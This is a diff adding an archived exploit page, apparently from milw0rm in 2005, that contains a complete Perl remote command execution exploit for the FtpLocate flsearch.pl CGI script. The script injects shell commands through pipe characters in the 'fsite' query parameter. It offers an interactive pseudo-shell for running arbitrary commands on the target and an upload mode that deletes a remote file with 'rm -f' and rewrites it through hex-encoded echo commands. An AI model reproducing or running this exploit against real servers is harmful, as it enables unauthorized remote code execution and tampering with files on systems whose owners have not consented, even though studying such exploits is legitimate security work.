@@ -1,0 +1,129 @@
+<html><head><title>FtpLocate <= 2.02 (current) Remote Command Execution Exploit</title></head><pre>## Alot of code for a cgi | vuln. 
+# /str0ke
+
+#!/usr/bin/perl
+#
+# FtpLocate &lt;= 2.02 (current) remote exploit
+# VERY PRIVATE VERSION
+# DO NOT DISTRIBUTE
+#
+# newbug Tseng [at] chroot.org
+#
+
+sub my_socket
+{
+       my $s=IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,
+                               PeerPort =&gt; 80,
+                               Proto =&gt; &quot;tcp&quot;) or die &quot;socket: &quot;;
+}
+sub ch2hex
+{
+       $chr = $_[0];
+       $out=&quot;&quot;;
+       for($i=0;$i&lt;length($chr);$i++)
+       {
+               $ch = substr($chr,$i,1);
+
+               if($ch eq &quot;\&quot;&quot;)
+               {
+                       $out.=&quot;%5c%22&quot;;
+               }
+
+               elsif($ch eq &quot;\$&quot;)
+               {
+                       $out.=&quot;%5c%24&quot;;
+               }
+               elsif($ch eq &quot;\@&quot;)
+               {
+                       $out.=&quot;%5c%40&quot;;
+               }
+               else
+               {
+                       $out.=&quot;%&quot;.sprintf(&quot;%2.2x&quot;,ord($ch));
+               }
+       }
+       $out;
+}
+sub upload_file
+{
+       print &quot;local file: &quot;;
+       chomp($lfile = &lt;STDIN&gt;);
+       print &quot;remote file: &quot;;
+       chomp($rfile = &lt;STDIN&gt;);
+
+       my $socket = &amp;my_socket($host);
+       print $socket &quot;GET $cgi?query=xx\&amp;fsite=|rm%20-f%20$rfile| $junk&quot;;
+       close $socket;
+       print &quot;remove $host:$rfile done.\n&quot;;
+
+       my @DATA = `cat $lfile`;
+       $num=1;
+       $total = scalar @DATA;
+       foreach $DATA (@DATA)
+       {
+               $DATA = &amp;ch2hex($DATA);
+               my $socket = &amp;my_socket($host);
+               print $socket &quot;GET $cgi?query=xx\&amp;fsite=|echo%20\&quot;$DATA\&quot;%20&gt;&gt;$rfile| $junk&quot;;
+               print &quot;Send lfile \&quot;$lfile\&quot; to $host:$rfile ... ($num/$total)\n&quot;;
+               sleep(1);
+               close $socket;
+               $num++;
+       }
+}
+use IO::Socket::INET;
+
+print &quot;FtpLocate flsearch.pl remote exploit\n&quot;;
+print &quot;host: &quot;;
+chomp ($host = &lt;STDIN&gt;);
+print &quot;port (80): &quot;;
+chomp ($port = &lt;STDIN&gt;);
+if($port eq &quot;&quot;)
+{
+       $port = 80;
+}
+print &quot;version 1.0/1.1 (1.0): &quot;;
+chomp ($ver = &lt;STDIN&gt;);
+if($ver eq &quot;&quot;)
+{
+       $ver = &quot;1.0&quot;;
+}
+print &quot;cmd/upload (cmd): &quot;;                                                     chomp ($opt = &lt;STDIN&gt;);
+if($opt eq &quot;&quot;)                                                                  {
+       $opt = &quot;cmd&quot;;
+}
+print &quot;cgi path (/cgi-bin/ftplocate/flsearch.pl): &quot;;
+chomp ($cgi = &lt;STDIN&gt;);
+if($cgi eq &quot;&quot;)
+{
+       $cgi = &quot;/cgi-bin/ftplocate/flsearch.pl&quot;;
+}
+if($ver eq &quot;1.0&quot;)
+{
+       $junk = &quot;HTTP/1.0\n\n&quot;;
+}
+else
+{
+       $junk = &quot;HTTP/1.1\nHost: $host\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624 Netscape/7.1\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\nAccept-Language: zh-tw,en-us;q=0.7,en;q=0.3\nAccept-Encoding: gzip,deflate\nAccept-Charset: Big5,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 300\nConnection: keep-alive\n\n&quot;;                                        }
+if($opt eq &quot;cmd&quot;)
+{
+       while(1){
+               print &quot;h4ck3r\@[$host]:~\$ &quot;;
+               chomp ($cmd = &lt;STDIN&gt;);
+               if($cmd ne &quot;&quot;)
+               {
+                       print &quot;Send command \&quot;$cmd\&quot; to $host ...\n&quot;;
+                       $socket = &amp;my_socket($host);
+                       $cmd =~ s/\s/%20/g;
+
+                       print $socket &quot;GET $cgi?query=xx\&amp;fsite=|$cmd| $junk&quot;;
+                       print &quot;done.\n&quot;;
+               }
+       }
+}
+elsif($opt eq &quot;upload&quot;)
+{
+       &amp;upload_file($lfile);
+}
+	print &quot;done.\n&quot;;
+
+# milw0rm.com [2005-07-25]</pre></html>
